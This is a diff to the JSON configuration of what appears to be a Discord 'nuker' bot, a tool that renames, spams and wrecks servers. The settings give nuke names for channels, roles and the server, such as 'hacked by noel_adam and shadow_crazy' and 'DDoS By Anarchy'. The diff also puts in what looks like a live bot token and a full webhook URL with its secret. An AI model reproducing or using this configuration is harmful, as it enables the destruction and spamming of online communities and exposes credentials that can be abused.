@@ -1,17 +1,17 @@
 {
-	"token": "Token", 
+	"token": "MTIwNDA1MTc3MzE4NzI5MzE4NA.GgHy5r.LZl1ZYi-xcsDMOeEXBB4TrF2ERbFBTurID_Jng", 
 	"prefix": "!", "command_cooldown_time": 30, 
 
-	"loghook": "https://discordapp.com/api/webhooks/1105189152628158585/0gU-A80873sYOhlcUUsZqJx39FaGXy6qzy4pjLuRp77ZChgtDtrTkl7QNuZrKYMvFAoM", 
+	"loghook": "https://discord.com/api/webhooks/1204201746071691284/xfUuH7Q__WCrWw7ZWrqVOAmL6g43L4kbZngIOr3yj_KO0tfB_ewfuYetEtDItVRsWC4L", 
 	"logs_output_type": "console/webhook", 
 
-	"nuke_channels_name": "crash3d-by-anarchy", 
+	"nuke_channels_name": "crash3d-by-noel with help shadow_crazy_adam", 
 	"nuke_voice_name": "DDoS By Anarchy", 
 	"nuke_categories_name": "DDoS By Anarchy", 
-	"nuke_server_name": "...<<<CrAsH3D>>>...", 
-	"nuke_roles_name": "crash3d", 
+	"nuke_server_name": "...<<<hacked by noel_adam and shadow_crazy>>>...", 
+	"nuke_roles_name": "was3 was3", 
 	"nuke_webhook_name": "CrAsH3D by Anarchy Syndicate", 
 
 	"nuke_avatar_file": "avatar.jpg", 
 	"spam_text_file": "spam_text.txt"
-}
+} 
